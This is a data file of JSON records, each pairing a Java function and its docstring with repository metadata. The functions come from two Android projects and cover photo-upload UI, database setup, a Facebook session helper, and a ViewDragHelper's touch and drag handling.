{"docstring": "/**\n * More than likely on another thread\n */\n", "func_signal": "public void onFaceDetectionStarted(PhotoUpload selection)", "code": "{\n    mFaceDetectIndicator.post(new Runnable() {\n        public void run() {\n            Animation anim = AnimationUtils.loadAnimation(getContext(), R.anim.fade_in);\n            mFaceDetectIndicator.startAnimation(anim);\n            mFaceDetectIndicator.setVisibility(View.VISIBLE);\n        }\n    });\n}", "path": "client\\src\\uk\\co\\senab\\photup\\views\\PhotoTagItemLayout.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * This is called when the database is first created. Usually you should call createTable\n * statements here to create the tables that will store your data.\n */\n", "func_signal": "@Override\npublic void onCreate(SQLiteDatabase db, ConnectionSource connectionSource)", "code": "{\n    try {\n        if (Flags.DEBUG) {\n            Log.i(DatabaseHelper.class.getName(), \"onCreate\");\n        }\n        for (Class<?> dataClass : DATA_CLASSES) {\n            TableUtils.createTable(connectionSource, dataClass);\n        }\n\n    } catch (SQLException e) {\n        Log.e(DatabaseHelper.class.getName(), \"Can't create database\", e);\n        throw new RuntimeException(e);\n    }\n}", "path": "client\\src\\uk\\co\\senab\\photup\\DatabaseHelper.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * Stores the session data on disk.\n */\n", "func_signal": "public void save(Context context)", "code": "{\n    if (Flags.DEBUG) {\n        Log.d(getClass().getSimpleName(), \"Saving Session! Expires: \" + fb.getAccessExpires());\n    }\n    Editor editor = context.getSharedPreferences(KEY, Context.MODE_PRIVATE).edit();\n    editor.putString(TOKEN, fb.getAccessToken());\n    editor.putLong(EXPIRES, fb.getAccessExpires());\n    editor.putString(UID, uid);\n    editor.putString(NAME, name);\n    editor.commit();\n}", "path": "client\\src\\uk\\co\\senab\\photup\\facebook\\Session.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "// Returns the cropping rectangle in image space.\n", "func_signal": "public RectF getCropRect()", "code": "{\n    final float width = mImageRect.width();\n    final float height = mImageRect.height();\n\n    return new RectF(mCropRect.left / width, mCropRect.top / height, mCropRect.right / width,\n            mCropRect.bottom\n                    / height);\n}", "path": "client\\src\\uk\\co\\senab\\photup\\views\\HighlightView.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * Called when the activity is first created.\n */\n", "func_signal": "@Override\npublic void onCreate(Bundle savedInstanceState)", "code": "{\n    super.onCreate(savedInstanceState);\n    mPhotoController = PhotoUploadController.getFromContext(this);\n    EventBus.getDefault().register(this);\n\n    if (Utils.isUploadingPaused(this)) {\n        showUploadingDisabledCrouton();\n    }\n}", "path": "client\\src\\uk\\co\\senab\\photup\\AbstractPhotoUploadActivity.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "// And to convert the image URI to the direct file system path of the image\n// file\n", "func_signal": "public static String getPathFromContentUri(ContentResolver cr, Uri contentUri)", "code": "{\n    if (Flags.DEBUG) {\n        Log.d(\"Utils\", \"Getting file path for Uri: \" + contentUri);\n    }\n\n    String returnValue = null;\n\n    if (ContentResolver.SCHEME_CONTENT.equals(contentUri.getScheme())) {\n        // can post image\n        String[] proj = {MediaStore.Images.Media.DATA};\n        Cursor cursor = cr.query(contentUri, proj, null, null, null);\n\n        if (null != cursor) {\n            if (cursor.moveToFirst()) {\n                returnValue = cursor\n                        .getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));\n            }\n            cursor.close();\n        }\n    } else if (ContentResolver.SCHEME_FILE.equals(contentUri.getScheme())) {\n        returnValue = contentUri.getPath();\n    }\n\n    return returnValue;\n}", "path": "client\\src\\uk\\co\\senab\\photup\\util\\Utils.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * Called when the {@link ContentObserver} on the cursor receives a change notification. The\n * default implementation provides the auto-requery logic, but may be overridden by sub classes.\n *\n * @see ContentObserver#onChange(boolean)\n */\n", "func_signal": "@SuppressWarnings(\"deprecation\")\nprotected void onContentChanged()", "code": "{\n    if (mAutoRequery && mCursor != null && !mCursor.isClosed()) {\n        mDataValid = mCursor.requery();\n    }\n}", "path": "client\\src\\uk\\co\\senab\\photup\\util\\CursorPagerAdapter.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * The result of a call to this method is equivalent to\n * {@link #processTouchEvent(android.view.MotionEvent)} receiving an\n * ACTION_CANCEL event.\n */\n", "func_signal": "public void cancel()", "code": "{\n    mActivePointerId = INVALID_POINTER;\n    clearMotionHistory();\n\n    if (mVelocityTracker != null) {\n        mVelocityTracker.recycle();\n        mVelocityTracker = null;\n    }\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Clamp the magnitude of value for absMin and absMax. If the value is below\n * the minimum, it will be clamped to zero. If the value is above the\n * maximum, it will be clamped to the maximum.\n *\n * @param value  Value to clamp\n * @param absMin Absolute value of the minimum significant value to return\n * @param absMax Absolute value of the maximum value to return\n * @return The clamped value with the same sign as <code>value</code>\n */\n", "func_signal": "private float clampMag(float value, float absMin, float absMax)", "code": "{\n    final float absValue = Math.abs(value);\n    if (absValue < absMin)\n        return 0;\n    if (absValue > absMax)\n        return value > 0 ? absMax : -absMax;\n    return value;\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Check if any pointer tracked in the current gesture has crossed the\n * required slop threshold.\n * <p>\n * This depends on internal state populated by\n * {@link #shouldInterceptTouchEvent(android.view.MotionEvent)} or\n * {@link #processTouchEvent(android.view.MotionEvent)}. You should only\n * rely on the results of this method after all currently available touch\n * data has been provided to one of these two methods.\n * </p>\n *\n * @param directions Combination of direction flags, see\n *                   {@link #DIRECTION_HORIZONTAL}, {@link #DIRECTION_VERTICAL},\n *                   {@link #DIRECTION_ALL}\n * @return true if the slop threshold has been crossed, false otherwise\n */\n", "func_signal": "public boolean checkTouchSlop(int directions)", "code": "{\n    final int count = mInitialMotionX.length;\n    for (int i = 0; i < count; i++) {\n        if (checkTouchSlop(directions, i)) {\n            return true;\n        }\n    }\n    return false;\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Clamp the magnitude of value for absMin and absMax. If the value is below\n * the minimum, it will be clamped to zero. If the value is above the\n * maximum, it will be clamped to the maximum.\n *\n * @param value  Value to clamp\n * @param absMin Absolute value of the minimum significant value to return\n * @param absMax Absolute value of the maximum value to return\n * @return The clamped value with the same sign as <code>value</code>\n */\n", "func_signal": "private int clampMag(int value, int absMin, int absMax)", "code": "{\n    final int absValue = Math.abs(value);\n    if (absValue < absMin)\n        return 0;\n    if (absValue > absMax)\n        return value > 0 ? absMax : -absMax;\n    return value;\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Check if this event as provided to the parent view's\n * onInterceptTouchEvent should cause the parent to intercept the touch\n * event stream.\n *\n * @param ev MotionEvent provided to onInterceptTouchEvent\n * @return true if the parent view should return true from\n * onInterceptTouchEvent\n */\n", "func_signal": "public boolean shouldInterceptTouchEvent(MotionEvent ev)", "code": "{\n    final int action = MotionEventCompat.getActionMasked(ev);\n    final int actionIndex = MotionEventCompat.getActionIndex(ev);\n\n    if (action == MotionEvent.ACTION_DOWN) {\n        // Reset things for a new event stream, just in case we didn't get\n        // the whole previous stream.\n        cancel();\n    }\n\n    if (mVelocityTracker == null) {\n        mVelocityTracker = VelocityTracker.obtain();\n    }\n    mVelocityTracker.addMovement(ev);\n\n    switch (action) {\n        case MotionEvent.ACTION_DOWN: {\n            final float x = ev.getX();\n            final float y = ev.getY();\n            final int pointerId = MotionEventCompat.getPointerId(ev, 0);\n            saveInitialMotion(x, y, pointerId);\n\n            final View toCapture = findTopChildUnder((int) x, (int) y);\n\n            // Catch a settling view if possible.\n            if (toCapture == mCapturedView && mDragState == STATE_SETTLING) {\n                tryCaptureViewForDrag(toCapture, pointerId);\n            }\n\n            final int edgesTouched = mInitialEdgeTouched[pointerId];\n            if ((edgesTouched & mTrackingEdges) != 0) {\n                mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n            }\n            break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_DOWN: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            final float x = MotionEventCompat.getX(ev, actionIndex);\n            final float y = MotionEventCompat.getY(ev, actionIndex);\n\n            saveInitialMotion(x, y, pointerId);\n\n            // A ViewDragHelper can only manipulate one view at a time.\n            if (mDragState == STATE_IDLE) {\n                final int edgesTouched = mInitialEdgeTouched[pointerId];\n                if ((edgesTouched & mTrackingEdges) != 0) {\n                    mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n                }\n            } else if (mDragState == STATE_SETTLING) {\n                // Catch a settling view if possible.\n                final View toCapture = findTopChildUnder((int) x, (int) y);\n                if (toCapture == mCapturedView) {\n                    tryCaptureViewForDrag(toCapture, pointerId);\n                }\n            }\n            break;\n        }\n\n        case MotionEvent.ACTION_MOVE: {\n            // First to cross a touch slop over a draggable view wins. Also\n            // report edge drags.\n            final int pointerCount = MotionEventCompat.getPointerCount(ev);\n            for (int i = 0; i < pointerCount; i++) {\n                final int pointerId = MotionEventCompat.getPointerId(ev, i);\n                final float x = MotionEventCompat.getX(ev, i);\n                final float y = MotionEventCompat.getY(ev, i);\n                final float dx = x - mInitialMotionX[pointerId];\n                final float dy = y - mInitialMotionY[pointerId];\n\n                reportNewEdgeDrags(dx, dy, pointerId);\n                if (mDragState == STATE_DRAGGING) {\n                    // Callback might have started an edge drag\n                    break;\n                }\n\n                final View toCapture = findTopChildUnder((int) x, (int) y);\n                if (toCapture != null && checkTouchSlop(toCapture, dx, dy)\n                        && tryCaptureViewForDrag(toCapture, pointerId)) {\n                    break;\n                }\n            }\n            saveLastMotion(ev);\n            break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_UP: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            clearMotionHistory(pointerId);\n            break;\n        }\n\n        case MotionEvent.ACTION_UP:\n        case MotionEvent.ACTION_CANCEL: {\n            cancel();\n            break;\n        }\n    }\n\n    return mDragState == STATE_DRAGGING;\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Capture a specific child view for dragging within the parent. The\n * callback will be notified but\n * {@link me.imid.swipebacklayout.lib.ViewDragHelper.Callback#tryCaptureView(android.view.View, int)}\n * will not be asked permission to capture this view.\n *\n * @param childView       Child view to capture\n * @param activePointerId ID of the pointer that is dragging the captured\n *                        child view\n */\n", "func_signal": "public void captureChildView(View childView, int activePointerId)", "code": "{\n    if (childView.getParent() != mParentView) {\n        throw new IllegalArgumentException(\"captureChildView: parameter must be a descendant \"\n                + \"of the ViewDragHelper's tracked parent view (\" + mParentView + \")\");\n    }\n\n    mCapturedView = childView;\n    mActivePointerId = activePointerId;\n    mCallback.onViewCaptured(childView, activePointerId);\n    setDragState(STATE_DRAGGING);\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Find the topmost child under the given point within the parent view's\n * coordinate system. The child order is determined using\n * {@link me.imid.swipebacklayout.lib.ViewDragHelper.Callback#getOrderedChildIndex(int)}\n * .\n *\n * @param x X position to test in the parent's coordinate system\n * @param y Y position to test in the parent's coordinate system\n * @return The topmost child view under (x, y) or null if none found.\n */\n", "func_signal": "public View findTopChildUnder(int x, int y)", "code": "{\n    final int childCount = mParentView.getChildCount();\n    for (int i = childCount - 1; i >= 0; i--) {\n        final View child = mParentView.getChildAt(mCallback.getOrderedChildIndex(i));\n        if (x >= child.getLeft() && x < child.getRight() && y >= child.getTop()\n                && y < child.getBottom()) {\n            return child;\n        }\n    }\n    return null;\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Determine if the supplied view is under the given point in the parent\n * view's coordinate system.\n *\n * @param view Child view of the parent to hit test\n * @param x    X position to test in the parent's coordinate system\n * @param y    Y position to test in the parent's coordinate system\n * @return true if the supplied view is under the given point, false\n * otherwise\n */\n", "func_signal": "public boolean isViewUnder(View view, int x, int y)", "code": "{\n    if (view == null) {\n        return false;\n    }\n    return x >= view.getLeft() && x < view.getRight() && y >= view.getTop()\n            && y < view.getBottom();\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Settle the captured view at the given (left, top) position. The\n * appropriate velocity from prior motion will be taken into account. If\n * this method returns true, the caller should invoke\n * {@link #continueSettling(boolean)} on each subsequent frame to continue\n * the motion until it returns false. If this method returns false there is\n * no further work to do to complete the movement.\n *\n * @param finalLeft Settled left edge position for the captured view\n * @param finalTop  Settled top edge position for the captured view\n * @return true if animation should continue through\n * {@link #continueSettling(boolean)} calls\n */\n", "func_signal": "public boolean settleCapturedViewAt(int finalLeft, int finalTop)", "code": "{\n    if (!mReleaseInProgress) {\n        throw new IllegalStateException(\"Cannot settleCapturedViewAt outside of a call to \"\n                + \"Callback#onViewReleased\");\n    }\n\n    return forceSettleCapturedViewAt(finalLeft, finalTop,\n            (int) VelocityTrackerCompat.getXVelocity(mVelocityTracker, mActivePointerId),\n            (int) VelocityTrackerCompat.getYVelocity(mVelocityTracker, mActivePointerId));\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Animate the view <code>child</code> to the given (left, top) position. If\n * this method returns true, the caller should invoke\n * {@link #continueSettling(boolean)} on each subsequent frame to continue\n * the motion until it returns false. If this method returns false there is\n * no further work to do to complete the movement.\n * <p>\n * This operation does not count as a capture event, though\n * {@link #getCapturedView()} will still report the sliding view while the\n * slide is in progress.\n * </p>\n *\n * @param child     Child view to capture and animate\n * @param finalLeft Final left position of child\n * @param finalTop  Final top position of child\n * @return true if animation should continue through\n * {@link #continueSettling(boolean)} calls\n */\n", "func_signal": "public boolean smoothSlideViewTo(View child, int finalLeft, int finalTop)", "code": "{\n    mCapturedView = child;\n    mActivePointerId = INVALID_POINTER;\n\n    return forceSettleCapturedViewAt(finalLeft, finalTop, 0, 0);\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Factory method to create a new ViewDragHelper.\n *\n * @param forParent   Parent view to monitor\n * @param sensitivity Multiplier for how sensitive the helper should be\n *                    about detecting the start of a drag. Larger values are more\n *                    sensitive. 1.0f is normal.\n * @param cb          Callback to provide information and receive events\n * @return a new ViewDragHelper instance\n */\n", "func_signal": "public static ViewDragHelper create(ViewGroup forParent, float sensitivity, Callback cb)", "code": "{\n    final ViewDragHelper helper = create(forParent, cb);\n    helper.mTouchSlop = (int) (helper.mTouchSlop * (1 / sensitivity));\n    return helper;\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Settle the captured view at the given (left, top) position.\n *\n * @param finalLeft Target left position for the captured view\n * @param finalTop  Target top position for the captured view\n * @param xvel      Horizontal velocity\n * @param yvel      Vertical velocity\n * @return true if animation should continue through\n * {@link #continueSettling(boolean)} calls\n */\n", "func_signal": "private boolean forceSettleCapturedViewAt(int finalLeft, int finalTop, int xvel, int yvel)", "code": "{\n    final int startLeft = mCapturedView.getLeft();\n    final int startTop = mCapturedView.getTop();\n    final int dx = finalLeft - startLeft;\n    final int dy = finalTop - startTop;\n\n    if (dx == 0 && dy == 0) {\n        // Nothing to do. Send callbacks, be done.\n        mScroller.abortAnimation();\n        setDragState(STATE_IDLE);\n        return false;\n    }\n\n    final int duration = computeSettleDuration(mCapturedView, dx, dy, xvel, yvel);\n    mScroller.startScroll(startLeft, startTop, dx, dy, duration);\n\n    setDragState(STATE_SETTLING);\n    return true;\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Apps should use ViewDragHelper.create() to get a new instance. This will\n * allow VDH to use internal compatibility implementations for different\n * platform versions.\n *\n * @param context   Context to initialize config-dependent params from\n * @param forParent Parent view to monitor\n */\n", "func_signal": "private ViewDragHelper(Context context, ViewGroup forParent, Callback cb)", "code": "{\n    if (forParent == null) {\n        throw new IllegalArgumentException(\"Parent view may not be null\");\n    }\n    if (cb == null) {\n        throw new IllegalArgumentException(\"Callback may not be null\");\n    }\n\n    mParentView = forParent;\n    mCallback = cb;\n\n    final ViewConfiguration vc = ViewConfiguration.get(context);\n    final float density = context.getResources().getDisplayMetrics().density;\n    mEdgeSize = (int) (EDGE_SIZE * density + 0.5f);\n\n    mTouchSlop = vc.getScaledTouchSlop();\n    mMaxVelocity = vc.getScaledMaximumFlingVelocity();\n    mMinVelocity = vc.getScaledMinimumFlingVelocity();\n    mScroller = ScrollerCompat.create(context, sInterpolator);\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Move the captured settling view by the appropriate amount for the current\n * time. If <code>continueSettling</code> returns true, the caller should\n * call it again on the next frame to continue.\n *\n * @param deferCallbacks true if state callbacks should be deferred via\n *                       posted message. Set this to true if you are calling this\n *                       method from {@link android.view.View#computeScroll()} or\n *                       similar methods invoked as part of layout or drawing.\n * @return true if settle is still in progress\n */\n", "func_signal": "public boolean continueSettling(boolean deferCallbacks)", "code": "{\n    if (mDragState == STATE_SETTLING) {\n        boolean keepGoing = mScroller.computeScrollOffset();\n        final int x = mScroller.getCurrX();\n        final int y = mScroller.getCurrY();\n        final int dx = x - mCapturedView.getLeft();\n        final int dy = y - mCapturedView.getTop();\n\n        if (dx != 0) {\n            mCapturedView.offsetLeftAndRight(dx);\n        }\n        if (dy != 0) {\n            mCapturedView.offsetTopAndBottom(dy);\n        }\n\n        if (dx != 0 || dy != 0) {\n            mCallback.onViewPositionChanged(mCapturedView, x, y, dx, dy);\n        }\n\n        if (keepGoing && x == mScroller.getFinalX() && y == mScroller.getFinalY()) {\n            // Close enough. The interpolator/scroller might think we're\n            // still moving\n            // but the user sure doesn't.\n            mScroller.abortAnimation();\n            keepGoing = mScroller.isFinished();\n        }\n\n        if (!keepGoing) {\n            if (deferCallbacks) {\n                mParentView.post(mSetIdleRunnable);\n            } else {\n                setDragState(STATE_IDLE);\n            }\n        }\n    }\n\n    return mDragState == STATE_SETTLING;\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Sets the sensitivity of the dragger.\n *\n * @param context     The application context.\n * @param sensitivity value between 0 and 1, the final value for touchSlop =\n *                    ViewConfiguration.getScaledTouchSlop * (1 / s);\n */\n", "func_signal": "public void setSensitivity(Context context, float sensitivity)", "code": "{\n    float s = Math.max(0f, Math.min(1.0f, sensitivity));\n    ViewConfiguration viewConfiguration = ViewConfiguration.get(context);\n    mTouchSlop = (int) (viewConfiguration.getScaledTouchSlop() * (1 / s));\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Like all callback events this must happen on the UI thread, but release\n * involves some extra semantics. During a release (mReleaseInProgress) is\n * the only time it is valid to call {@link #settleCapturedViewAt(int, int)}\n * or {@link #flingCapturedView(int, int, int, int)}.\n */\n", "func_signal": "private void dispatchViewReleased(float xvel, float yvel)", "code": "{\n    mReleaseInProgress = true;\n    mCallback.onViewReleased(mCapturedView, xvel, yvel);\n    mReleaseInProgress = false;\n\n    if (mDragState == STATE_DRAGGING) {\n        // onViewReleased didn't call a method that would have changed this.\n        // Go idle.\n        setDragState(STATE_IDLE);\n    }\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Check if the specified pointer tracked in the current gesture has crossed\n * the required slop threshold.\n * <p>\n * This depends on internal state populated by\n * {@link #shouldInterceptTouchEvent(android.view.MotionEvent)} or\n * {@link #processTouchEvent(android.view.MotionEvent)}. You should only\n * rely on the results of this method after all currently available touch\n * data has been provided to one of these two methods.\n * </p>\n *\n * @param directions Combination of direction flags, see\n *                   {@link #DIRECTION_HORIZONTAL}, {@link #DIRECTION_VERTICAL},\n *                   {@link #DIRECTION_ALL}\n * @param pointerId  ID of the pointer to slop check as specified by\n *                   MotionEvent\n * @return true if the slop threshold has been crossed, false otherwise\n */\n", "func_signal": "public boolean checkTouchSlop(int directions, int pointerId)", "code": "{\n    if (!isPointerDown(pointerId)) {\n        return false;\n    }\n\n    final boolean checkHorizontal = (directions & DIRECTION_HORIZONTAL) == DIRECTION_HORIZONTAL;\n    final boolean checkVertical = (directions & DIRECTION_VERTICAL) == DIRECTION_VERTICAL;\n\n    final float dx = mLastMotionX[pointerId] - mInitialMotionX[pointerId];\n    final float dy = mLastMotionY[pointerId] - mInitialMotionY[pointerId];\n\n    if (checkHorizontal && checkVertical) {\n        return dx * dx + dy * dy > mTouchSlop * mTouchSlop;\n    } else if (checkHorizontal) {\n        return Math.abs(dx) > mTouchSlop;\n    } else if (checkVertical) {\n        return Math.abs(dy) > mTouchSlop;\n    }\n    return false;\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * {@link #cancel()}, but also abort all motion in progress and snap to the\n * end of any animation.\n */\n", "func_signal": "public void abort()", "code": "{\n    cancel();\n    if (mDragState == STATE_SETTLING) {\n        final int oldX = mScroller.getCurrX();\n        final int oldY = mScroller.getCurrY();\n        mScroller.abortAnimation();\n        final int newX = mScroller.getCurrX();\n        final int newY = mScroller.getCurrY();\n        mCallback.onViewPositionChanged(mCapturedView, newX, newY, newX - oldX, newY - oldY);\n    }\n    setDragState(STATE_IDLE);\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Process a touch event received by the parent view. This method will\n * dispatch callback events as needed before returning. The parent view's\n * onTouchEvent implementation should call this.\n *\n * @param ev The touch event received by the parent view\n */\n", "func_signal": "public void processTouchEvent(MotionEvent ev)", "code": "{\n    final int action = MotionEventCompat.getActionMasked(ev);\n    final int actionIndex = MotionEventCompat.getActionIndex(ev);\n\n    if (action == MotionEvent.ACTION_DOWN) {\n        // Reset things for a new event stream, just in case we didn't get\n        // the whole previous stream.\n        cancel();\n    }\n\n    if (mVelocityTracker == null) {\n        mVelocityTracker = VelocityTracker.obtain();\n    }\n    mVelocityTracker.addMovement(ev);\n\n    switch (action) {\n        case MotionEvent.ACTION_DOWN: {\n            final float x = ev.getX();\n            final float y = ev.getY();\n            final int pointerId = MotionEventCompat.getPointerId(ev, 0);\n            final View toCapture = findTopChildUnder((int) x, (int) y);\n\n            saveInitialMotion(x, y, pointerId);\n\n            // Since the parent is already directly processing this touch\n            // event,\n            // there is no reason to delay for a slop before dragging.\n            // Start immediately if possible.\n            tryCaptureViewForDrag(toCapture, pointerId);\n\n            final int edgesTouched = mInitialEdgeTouched[pointerId];\n            if ((edgesTouched & mTrackingEdges) != 0) {\n                mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n            }\n            break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_DOWN: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            final float x = MotionEventCompat.getX(ev, actionIndex);\n            final float y = MotionEventCompat.getY(ev, actionIndex);\n\n            saveInitialMotion(x, y, pointerId);\n\n            // A ViewDragHelper can only manipulate one view at a time.\n            if (mDragState == STATE_IDLE) {\n                // If we're idle we can do anything! Treat it like a normal\n                // down event.\n\n                final View toCapture = findTopChildUnder((int) x, (int) y);\n                tryCaptureViewForDrag(toCapture, pointerId);\n\n                final int edgesTouched = mInitialEdgeTouched[pointerId];\n                if ((edgesTouched & mTrackingEdges) != 0) {\n                    mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n                }\n            } else if (isCapturedViewUnder((int) x, (int) y)) {\n                // We're still tracking a captured view. If the same view is\n                // under this\n                // point, we'll swap to controlling it with this pointer\n                // instead.\n                // (This will still work if we're \"catching\" a settling\n                // view.)\n\n                tryCaptureViewForDrag(mCapturedView, pointerId);\n            }\n            break;\n        }\n\n        case MotionEvent.ACTION_MOVE: {\n            if (mDragState == STATE_DRAGGING) {\n                final int index = MotionEventCompat.findPointerIndex(ev, mActivePointerId);\n                final float x = MotionEventCompat.getX(ev, index);\n                final float y = MotionEventCompat.getY(ev, index);\n                final int idx = (int) (x - mLastMotionX[mActivePointerId]);\n                final int idy = (int) (y - mLastMotionY[mActivePointerId]);\n\n                dragTo(mCapturedView.getLeft() + idx, mCapturedView.getTop() + idy, idx, idy);\n\n                saveLastMotion(ev);\n            } else {\n                // Check to see if any pointer is now over a draggable view.\n                final int pointerCount = MotionEventCompat.getPointerCount(ev);\n                for (int i = 0; i < pointerCount; i++) {\n                    final int pointerId = MotionEventCompat.getPointerId(ev, i);\n                    final float x = MotionEventCompat.getX(ev, i);\n                    final float y = MotionEventCompat.getY(ev, i);\n                    final float dx = x - mInitialMotionX[pointerId];\n                    final float dy = y - mInitialMotionY[pointerId];\n\n                    reportNewEdgeDrags(dx, dy, pointerId);\n                    if (mDragState == STATE_DRAGGING) {\n                        // Callback might have started an edge drag.\n                        break;\n                    }\n\n                    final View toCapture = findTopChildUnder((int) x, (int) y);\n                    if (checkTouchSlop(toCapture, dx, dy)\n                            && tryCaptureViewForDrag(toCapture, pointerId)) {\n                        break;\n                    }\n                }\n                saveLastMotion(ev);\n            }\n            break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_UP: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            if (mDragState == STATE_DRAGGING && pointerId == mActivePointerId) {\n                // Try to find another pointer that's still holding on to\n                // the captured view.\n                int newActivePointer = INVALID_POINTER;\n                final int pointerCount = MotionEventCompat.getPointerCount(ev);\n                for (int i = 0; i < pointerCount; i++) {\n                    final int id = MotionEventCompat.getPointerId(ev, i);\n                    if (id == mActivePointerId) {\n                        // This one's going away, skip.\n                        continue;\n                    }\n\n                    final float x = MotionEventCompat.getX(ev, i);\n                    final float y = MotionEventCompat.getY(ev, i);\n                    if (findTopChildUnder((int) x, (int) y) == mCapturedView\n                            && tryCaptureViewForDrag(mCapturedView, id)) {\n                        newActivePointer = mActivePointerId;\n                        break;\n                    }\n                }\n\n                if (newActivePointer == INVALID_POINTER) {\n                    // We didn't find another pointer still touching the\n                    // view, release it.\n                    releaseViewForPointerUp();\n                }\n            }\n            clearMotionHistory(pointerId);\n            break;\n        }\n\n        case MotionEvent.ACTION_UP: {\n            if (mDragState == STATE_DRAGGING) {\n                releaseViewForPointerUp();\n            }\n            cancel();\n            break;\n        }\n\n        case MotionEvent.ACTION_CANCEL: {\n            if (mDragState == STATE_DRAGGING) {\n                dispatchViewReleased(0, 0);\n            }\n            cancel();\n            break;\n        }\n    }\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
